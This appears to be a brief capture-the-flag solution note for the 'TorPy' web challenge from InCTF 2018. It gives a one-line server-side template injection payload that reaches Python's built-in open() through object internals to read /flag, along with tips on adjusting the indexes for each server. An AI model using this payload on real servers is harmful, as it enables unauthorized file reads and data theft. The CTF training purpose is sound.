# TorPy  

**Description**: where is /flag ?  

**Author**: [SpyD3r](https://twitter.com/tarunkantg)  

**Short Solution**: {{ list(list(%27%27.__reduce__(42).__getitem__(0).__globals__.values()).__getitem__(0).values()).__getitem__(125)("/flag").read() }}  

but you have to check the indexes, because it changes with server.  
-> 1st index will be the same everytime.  
-> 2nd index should be the value of : __builtins__  
-> 3rd index should be value of : < built-in function open>  

**Detailed Write-up**: [https://spyclub.tech/2018/inctf2018-web-challenge-writeup/](https://spyclub.tech/2018/inctf2018-web-challenge-writeup/)  

